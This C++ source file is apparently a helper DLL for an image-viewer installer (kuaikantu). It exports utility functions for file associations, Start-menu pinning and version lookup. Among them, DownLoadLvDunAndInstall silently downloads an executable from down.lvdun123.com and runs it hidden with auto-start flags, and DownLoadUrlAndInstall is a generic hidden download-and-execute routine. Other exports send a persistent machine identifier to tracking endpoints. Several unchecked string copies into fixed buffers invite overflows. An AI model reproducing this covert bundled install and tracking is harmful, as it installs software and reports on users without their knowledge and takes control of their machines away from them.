// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <string>
#include <atlbase.h>
#include <WTL/atlapp.h>
#include <Urlmon.h>
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Version.lib")
#include "shlobj.h"
#include <shellapi.h>
#include <tlhelp32.h>
#include <atlstr.h>
#include "..\atskernel\Utility\PeeIdHelper.h"
#include "..\atskernel\Utility\FileAssociationNew.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


//程序退出保证所有子线程结束
static HANDLE s_ListenHandle = CreateEvent(NULL,TRUE,TRUE,NULL);
//引用计数,默认是0
static int s_ListenCount = 0;
static CRITICAL_SECTION s_csListen;
static bool b_Init = false;

void ResetUserHandle()
{
	if(!b_Init){
		InitializeCriticalSection(&s_csListen);
		b_Init = true;
	}
	EnterCriticalSection(&s_csListen);
	if(s_ListenCount == 0)
	{
		ResetEvent(s_ListenHandle);
	}
	++s_ListenCount; //引用计数加1
	TSDEBUG4CXX("ResetUserHandle  s_ListenCount = "<<s_ListenCount);
	LeaveCriticalSection(&s_csListen);
}

void SetUserHandle()
{
	EnterCriticalSection(&s_csListen);
	--s_ListenCount;//引用计数减1
	TSDEBUG4CXX("SetUserHandle  s_ListenCount = "<<s_ListenCount);
	if (s_ListenCount == 0)
	{
		SetEvent(s_ListenHandle);
	}
	LeaveCriticalSection(&s_csListen);
}

DWORD WINAPI SendHttpStatThread(LPVOID pParameter)
{
	//TSAUTO();
	CHAR szUrl[MAX_PATH] = {0};
	strcpy(szUrl,(LPCSTR)pParameter);
	delete [] pParameter;

	CHAR szBuffer[MAX_PATH] = {0};
	::CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	__try
	{
		hr = ::URLDownloadToCacheFileA(NULL, szUrl, szBuffer, MAX_PATH, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
	}
	::CoUninitialize();
	SetUserHandle();
	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
}

 BOOL WStringToString(const std::wstring &wstr,std::string &str)
 {    
     int nLen = (int)wstr.length();    
     str.resize(nLen,' ');
 
     int nResult = WideCharToMultiByte(CP_ACP,0,(LPCWSTR)wstr.c_str(),nLen,(LPSTR)str.c_str(),nLen,NULL,NULL);
 
     if (nResult == 0)
     {
         return FALSE;
     }
 
     return TRUE;
 }

extern "C" __declspec(dllexport) void WaitForStat()
{
	DWORD ret = WaitForSingleObject(s_ListenHandle, 20000);
	if (ret == WAIT_TIMEOUT){
	}
	else if (ret == WAIT_OBJECT_0){	
	}
	if(b_Init){
		DeleteCriticalSection(&s_csListen);
	}
}

extern "C" __declspec(dllexport) void SetUpExit()
{
	TerminateProcess(GetCurrentProcess(), 0);
}

extern "C" __declspec(dllexport) void SendAnyHttpStat(CHAR *ec,CHAR *ea, CHAR *el,long ev)
{
	if (ec == NULL || ea == NULL)
	{
		return ;
	}
	TSAUTO();
	CHAR* szURL = new CHAR[MAX_PATH];
	memset(szURL, 0, MAX_PATH);
	char szPid[256] = {0};
	extern void GetPeerID(CHAR * pszPeerID);
	GetPeerID(szPid);
	std::string str = "";
	if (el != NULL )
	{
		str += "&el=";
		str += el;
	}
	if (ev != 0)
	{
		CHAR szev[MAX_PATH] = {0};
		sprintf(szev, "&ev=%ld",ev);
		str += szev;
	}
	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=UA-77713162-1&cid=%s&t=event&ec=%s&ea=%s%s",szPid,ec,ea,str.c_str());
	
	ResetUserHandle();
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
	CloseHandle(hThread);
	//SendHttpStatThread((LPVOID)szURL);
}

extern "C" __declspec(dllexport)  HWND FindClockWindow()
{
	HWND hWnd = ::FindWindowEx(NULL, NULL, L"Shell_TrayWnd", NULL);
	if (::IsWindow(hWnd)) {
		hWnd = ::FindWindowEx(hWnd, 0, L"TrayNotifyWnd", NULL);
		if (::IsWindow(hWnd)) {
			hWnd = ::FindWindowEx(hWnd, 0, L"TrayClockWClass", NULL);
			if (::IsWindow(hWnd)) {
				return hWnd;
			}
		}
	}
	return NULL;
}

extern "C" __declspec(dllexport) void GetFileVersionString(CHAR* pszFileName, CHAR * pszVersionString)
{
	if(pszFileName == NULL || pszVersionString == NULL)
		return ;

	BOOL bResult = FALSE;
	DWORD dwHandle = 0;
	DWORD dwSize = ::GetFileVersionInfoSizeA(pszFileName, &dwHandle);
	if(dwSize > 0)
	{
		CHAR * pVersionInfo = new CHAR[dwSize+1];
		if(::GetFileVersionInfoA(pszFileName, dwHandle, dwSize, pVersionInfo))
		{
			VS_FIXEDFILEINFO * pvi;
			UINT uLength = 0;
			if(::VerQueryValueA(pVersionInfo, "\\", (void **)&pvi, &uLength))
			{
				sprintf(pszVersionString, "%d.%d.%d.%d",
					HIWORD(pvi->dwFileVersionMS), LOWORD(pvi->dwFileVersionMS),
					HIWORD(pvi->dwFileVersionLS), LOWORD(pvi->dwFileVersionLS));
				bResult = TRUE;
			}
		}
		delete pVersionInfo;
	}
}


extern "C" __declspec(dllexport) void GetPeerID(CHAR * pszPeerID)
{
	HKEY hKEY;
	LPCSTR data_Set= "Software\\kuaikantu";
	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE,data_Set,0,KEY_READ,&hKEY))
	{
		char szValue[260] = {0};
		DWORD dwSize = sizeof(szValue);
		DWORD dwType = REG_SZ;
		if (::RegQueryValueExA(hKEY,"PeerId", 0, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS)
		{
			strcpy(pszPeerID, szValue);
			return;
		}
		::RegCloseKey(hKEY);
	}
	std::wstring wstrPeerID;
	GetPeerId_(wstrPeerID);
	std::string strPeerID;
	WStringToString(wstrPeerID, strPeerID);
	strcpy(pszPeerID,strPeerID.c_str());

	HKEY hKey, hTempKey;
	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software",0,KEY_SET_VALUE, &hKey))
	{
		if (ERROR_SUCCESS == ::RegCreateKeyA(hKey, "kuaikantu", &hTempKey))
		{
			::RegSetValueExA(hTempKey, "PeerId", 0, REG_SZ, (LPBYTE)pszPeerID, strlen(pszPeerID)+1);
		}
		RegCloseKey(hKey);
	}

}

extern "C" __declspec(dllexport) void NsisTSLOG(char* pszInfo)
{
	if(pszInfo == NULL)
		return;
	TSDEBUG4CXX("<NSIS> " << pszInfo);
}

extern "C" __declspec(dllexport) void GetTime(LPDWORD pnTime)
{
	TSAUTO();
	if(pnTime == NULL)
		return;
	time_t t;
	time( &t );
	*pnTime = (DWORD)t;
}

#ifndef DEFINE_KNOWN_FOLDER
#define DEFINE_KNOWN_FOLDER(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
	EXTERN_C const GUID DECLSPEC_SELECTANY name \
	= { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }
#endif

#ifndef FOLDERID_Public
DEFINE_KNOWN_FOLDER(FOLDERID_Public, 0xDFDF76A2, 0xC82A, 0x4D63, 0x90, 0x6A, 0x56, 0x44, 0xAC, 0x45, 0x73, 0x85);
#endif

EXTERN_C const GUID DECLSPEC_SELECTANY FOLDERID_UserPin \
	= { 0x9E3995AB, 0x1F9C, 0x4F13, { 0xB8, 0x27,  0x48,  0xB2,  0x4B,  0x6C,  0x71,  0x74 } };


extern "C" typedef HRESULT (__stdcall *PSHGetKnownFolderPath)(  const  GUID& rfid, DWORD dwFlags, HANDLE hToken, PWSTR* pszPath);


extern "C" __declspec(dllexport) bool GetProfileFolder(char* szMainDir)	// 失败返回'\0'
{
	char szAllUserDir[MAX_PATH] = {0};
	if(('\0') == szAllUserDir[0])
	{
		HMODULE hModule = ::LoadLibraryA("shell32.dll");
		PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
		if ( SHGetKnownFolderPath)
		{
			PWSTR szPath = NULL;
			HRESULT hr = SHGetKnownFolderPath( FOLDERID_Public, 0, NULL, &szPath );
			if ( FAILED( hr ) ||  szPath == NULL)
			{
				TSERROR4CXX("Failed to get public folder");
				FreeLibrary(hModule);
				return false;
			}
			if(0 == WideCharToMultiByte(CP_ACP, 0, szPath, -1, szAllUserDir, MAX_PATH, NULL, NULL))
			{
				TSERROR4CXX("WideCharToMultiByte failed");
				return false;
			}
			::CoTaskMemFree( szPath );
			FreeLibrary(hModule);
		}
		else
		{
			HRESULT hr = SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, szAllUserDir);
			if ( FAILED( hr ) )
			{
				TSERROR4CXX("Failed to get main pusher dir");
				return false;
			}
		}
	}
	strcpy(szMainDir, szAllUserDir);
	TSERROR4CXX("GetProfileFolder, szMainDir = "<<szMainDir);
	return true;
}


DWORD WINAPI DownLoadWork(LPVOID pParameter)
{
	//TSAUTO();
	CHAR szUrl[MAX_PATH] = {0};
	strcpy(szUrl,(LPCSTR)pParameter);

	CHAR szBuffer[MAX_PATH] = {0};
	DWORD len = GetTempPathA(MAX_PATH, szBuffer);
	if(len == 0)
	{
		return 0;
	}
	::PathCombineA(szBuffer,szBuffer,"GsSetup_0001.exe");
	::CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	__try
	{
		hr = ::URLDownloadToFileA(NULL, szUrl, szBuffer, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
	}
	::CoUninitialize();
	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
	{
		::ShellExecuteA(NULL,"open",szBuffer,"/s /run /setboot", NULL, SW_HIDE);
	}
	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
}

extern "C" __declspec(dllexport) void DownLoadLvDunAndInstall()
{
	TSAUTO();
	CHAR szUrl[] = "http://down.lvdun123.com/client/GsSetup_0001.exe";
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
	if (NULL != hThread)
	{
		DWORD dwRet = WaitForSingleObject(hThread, INFINITE);
		if (dwRet == WAIT_FAILED)
		{
			TSDEBUG4CXX("wait for DownLoa dBundled Software failed, error = " << ::GetLastError());
		}
		CloseHandle(hThread);
	}
	return;
}

DWORD WINAPI ThreadDownLoadUrl(LPVOID pParameter)
{
	//TSAUTO();
	const char *pUrl = (const char*)pParameter, *pName = pUrl + strlen(pUrl)+1, *pCmd = pName + strlen(pName)+1;
	//MessageBoxA(0, pUrl, "```pUrl", 0);MessageBoxA(0, pName, "````pName", 0);MessageBoxA(0, pCmd, "```pCmd", 0);
	::CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	__try
	{
		hr = ::URLDownloadToFileA(NULL, pUrl, pName, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
	}
	::CoUninitialize();
	if (SUCCEEDED(hr) && ::PathFileExistsA(pName))
	{
		::ShellExecuteA(NULL,"open", pName, pCmd, NULL, SW_HIDE);
	}
	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
}

extern "C" __declspec(dllexport) void DownLoadUrlAndInstall(const char* szUrl, const char* szName, const char* szCmd, int Millisec = INFINITE)
{
	TSAUTO();
	char szBuff[2048] = {0};
	char *pUrl = szBuff, *pName = szBuff + strlen(szUrl)+1, *pCmd = pName + strlen(szName)+1;
	strcpy(pUrl, szUrl);
	strcpy(pName, szName);
	strcpy(pCmd, szCmd);
	//MessageBoxA(0, pUrl, "pUrl", 0);MessageBoxA(0, pName, "pName", 0);MessageBoxA(0, pCmd, "pCmd", 0);

	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, ThreadDownLoadUrl, (LPVOID)szBuff,0, &dwThreadId);
	if (NULL != hThread)
	{
		DWORD dwRet = WaitForSingleObject(hThread, Millisec);
		if (dwRet == WAIT_FAILED)
		{
			TSDEBUG4CXX("wait for DownLoadd Software failed, error = " << ::GetLastError());
		}
		CloseHandle(hThread);
	}
	return;
}

extern "C" __declspec(dllexport) void Send2KKAnyHttpStat(CHAR *op, CHAR *cid, CHAR *ver)
{
	if (op == NULL || cid == NULL)
	{
		return ;
	}
	TSAUTO();	
	char szPid[256] = {0};
	extern void GetPeerID(CHAR * pszPeerID);
	GetPeerID(szPid);
	/*szPid[12] = '\0';
	char szMac[128] = {0};
	for(int i = 0; i < (int)strlen(szPid); ++i)
	{
		if(i != 0 && i%2 == 0)
		{
			strcat(szMac, "-");
		}
		szMac[strlen(szMac)] = szPid[i];
	}*/
	std::string str = "http://stat.ggxpc.com:8082/c?peerid=";
	str += szPid;
	str += "&appid=1001&proid=15";
	str += "&op=";
	str += op;
	str += "&cid=";
	str += cid;
	str += "&ver=";
	str += ver;
	CHAR* szURL = new CHAR[MAX_PATH];
	memset(szURL, 0, MAX_PATH);
	sprintf(szURL, "%s", str.c_str());
	//SendHttpStatThread((LPVOID)szURL);
	ResetUserHandle();
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
	CloseHandle(hThread);
}

#include <vector>
#include <COMUTIL.H>
typedef std::vector<std::wstring> VectorVerbName;
VectorVerbName*  GetVerbNames(bool bPin)
{
	TSAUTO();
	static bool bInit = false;
	static std::vector<std::wstring> vecPinStartMenuNames;
	static std::vector<std::wstring> vecUnPinStartMenuNames;
	if (!bInit )
	{	
		bInit = true;
		vecPinStartMenuNames.push_back(_T("锁定到开始菜单"));vecPinStartMenuNames.push_back(_T("附到「开始」菜单"));
		vecUnPinStartMenuNames.push_back(_T("从「开始」菜单脱离"));vecUnPinStartMenuNames.push_back(_T("(从「开始」菜单解锁"));
	}

	return bPin? &vecPinStartMenuNames : &vecUnPinStartMenuNames;
}

bool VerbNameMatch(TCHAR* tszName, bool bPin)
{
	TSAUTO();
	VectorVerbName *pVec = GetVerbNames(bPin);
	
	VectorVerbName::iterator iter = pVec->begin();
	VectorVerbName::iterator iter_end = pVec->end();
	while(iter!=iter_end)
	{
		std::wstring strName= *iter;
		if ( 0 == _wcsnicmp(tszName,strName.c_str(),strName.length()))
			return true;
		iter ++;
	}
	return false;
}

wchar_t* AnsiToUnicode( const char* szStr )
{
	int nLen = MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, NULL, 0 );
	if (nLen == 0)
	{
		return NULL;
	}
	wchar_t* pResult = new wchar_t[nLen];
	MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, pResult, nLen );
	return pResult;
}

#define IF_FAILED_OR_NULL_BREAK(rv,ptr) \
{if (FAILED(rv) || ptr == NULL) break;}

#define SAFE_RELEASE(p) { if(p) { (p)->Release(); (p)=NULL; } }
extern "C" __declspec(dllexport) bool PinToStartMenu4XP(bool bPin, char* szPath)
{
	TSAUTO();

	TCHAR file_dir[MAX_PATH + 1] = {0};
	TCHAR *file_name;
	wchar_t* pwstr_Path = AnsiToUnicode(szPath);
	if(pwstr_Path == NULL){
		return false;
	}

	wcscpy_s(file_dir,MAX_PATH,pwstr_Path);
	PathRemoveFileSpecW(file_dir);
	file_name = PathFindFileName(pwstr_Path);
	::CoInitialize(NULL);
	CComPtr<IShellDispatch> pShellDisp;
	CComPtr<Folder> folder_ptr;
	CComPtr<FolderItem> folder_item_ptr;
	CComPtr<FolderItemVerbs> folder_item_verbs_ptr;


	HRESULT rv = CoCreateInstance( CLSID_Shell, NULL, CLSCTX_SERVER,IID_IDispatch, (LPVOID *) &pShellDisp );
	do 
	{
		IF_FAILED_OR_NULL_BREAK(rv,pShellDisp);
		rv = pShellDisp->NameSpace(_variant_t(file_dir),&folder_ptr);
		IF_FAILED_OR_NULL_BREAK(rv,folder_ptr);
		rv = folder_ptr->ParseName(CComBSTR(file_name),&folder_item_ptr);
		IF_FAILED_OR_NULL_BREAK(rv,folder_item_ptr);
		rv = folder_item_ptr->Verbs(&folder_item_verbs_ptr);
		IF_FAILED_OR_NULL_BREAK(rv,folder_item_verbs_ptr);
		long count = 0;
		folder_item_verbs_ptr->get_Count(&count);
		for (long i = 0; i < count ; ++i)
		{
			FolderItemVerb* item_verb = NULL;
			rv = folder_item_verbs_ptr->Item(_variant_t(i),&item_verb);
			if (SUCCEEDED(rv) && item_verb)
			{
				CComBSTR bstrName;
				item_verb->get_Name(&bstrName);

				if ( VerbNameMatch(bstrName,bPin) )
				{
					TSDEBUG4CXX("Find Verb to Pin:"<< bstrName);
					int i = 0;
					do
					{
						rv = item_verb->DoIt();
						TSDEBUG4CXX("Try Do Verb. NO." << i+1 << ", return="<<rv);
						if (SUCCEEDED(rv))
						{
							::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_IDLIST |SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
								pwstr_Path,0);
							Sleep(500);
							delete [] pwstr_Path;
							::CoUninitialize();
							return true;
						}else
						{
							Sleep(500);
							rv = item_verb->DoIt();
						}
					}while ( i++ < 3);
						
					break;
				}
			}
		}
	} while (0);
	delete [] pwstr_Path;
	::CoUninitialize();
	return false;
}


extern "C" __declspec(dllexport) void RefleshIcon(char* szPath)
{
	wchar_t* pwstr_Path = AnsiToUnicode(szPath);
	::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_IDLIST |SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
								pwstr_Path,0);
	delete [] pwstr_Path;

}

extern "C" __declspec(dllexport) void GetUserPinPath(char* szPath)
{
	static std::wstring strUserPinPath(_T(""));

	if (strUserPinPath.length() <= 0)
	{
		HMODULE hModule = LoadLibrary( _T("shell32.dll") );
		if ( hModule == NULL )
		{
			return;
		}
		PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
		if (SHGetKnownFolderPath)
		{
			PWSTR pszPath = NULL;
			HRESULT hr = SHGetKnownFolderPath(FOLDERID_UserPin, 0, NULL, &pszPath );
			if (SUCCEEDED(hr))
			{
				TSDEBUG4CXX("UserPin Path: " << pszPath);
				strUserPinPath = pszPath;
				::CoTaskMemFree(pszPath);
			}
		}
		FreeLibrary(hModule);
	}
	int nLen = (int)strUserPinPath.length();    
    int nResult = WideCharToMultiByte(CP_ACP,0,(LPCWSTR)strUserPinPath.c_str(),nLen,szPath,nLen,NULL,NULL);
}

bool IsVistaOrLatter()
{
	OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
	{
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
		{
		}
	}
	return (osvi.dwMajorVersion >= 6);
}

extern "C" __declspec(dllexport) void SetAssociate(const char* szFileExts, BOOL bDo)
{
	TSERROR4CXX("SetAssociate, bDo = "<<bDo<<", szFileExts = "<<szFileExts);
	WCHAR* szFileExtsW = AnsiToUnicode(szFileExts);
	FileAssociationNew::Instance()->AssociateAll(szFileExtsW, bDo, TRUE);
	FileAssociationNew::Instance()->Update();
	delete [] szFileExtsW;
}

extern "C" __declspec(dllexport) void CreateImgKey(const char* szFileExts, BOOL bDo)
{
	TSERROR4CXX("CreateImgKey, szFileExts = "<<szFileExts);
	WCHAR* szFileExtsW = AnsiToUnicode(szFileExts);
	FileAssociationNew::Instance()->CreateImgKeyALL(szFileExtsW, bDo);
	delete [] szFileExtsW;
}

extern "C" __declspec(dllexport) void SetAssociateOld(const char* szFileExts, BOOL bDo)
{
	TSERROR4CXX("SetAssociate, bDo = "<<bDo<<", szFileExts = "<<szFileExts);
	WCHAR* szFileExtsW = AnsiToUnicode(szFileExts);
	FileAssociation::Instance()->AssociateAll(szFileExtsW, bDo, TRUE);
	FileAssociation::Instance()->Update();
	delete [] szFileExtsW;
}

extern "C" __declspec(dllexport) void CreateImgKeyOld(const char* szFileExts, BOOL bDo)
{
	TSERROR4CXX("CreateImgKey, szFileExts = "<<szFileExts);
	WCHAR* szFileExtsW = AnsiToUnicode(szFileExts);
	FileAssociation::Instance()->CreateImgKeyALL(szFileExtsW, bDo);
	delete [] szFileExtsW;
}

BOOL GetNtVersionNumbers(OSVERSIONINFOEX& osVersionInfoEx)
{
	BOOL bRet= FALSE;
	HMODULE hModNtdll= ::LoadLibraryW(L"ntdll.dll");
	if (hModNtdll)
	{
		typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
		pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
		pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
		if (pfRtlGetNtVersionNumbers)
		{
			pfRtlGetNtVersionNumbers(&osVersionInfoEx.dwMajorVersion, &osVersionInfoEx.dwMinorVersion,&osVersionInfoEx.dwBuildNumber);
			osVersionInfoEx.dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
		}

		::FreeLibrary(hModNtdll);
		hModNtdll = NULL;
	}

	return bRet;
}

extern "C" __declspec(dllexport) void NewGetOSVersionInfo(char* szOutput)
{
	OSVERSIONINFOEX osvi;
	ZeroMemory(&osvi,sizeof(OSVERSIONINFOEX));
	if (!GetNtVersionNumbers(osvi))
	{
		return;
	}
	sprintf(szOutput, "%u.%u", osvi.dwMajorVersion, osvi.dwMinorVersion);
}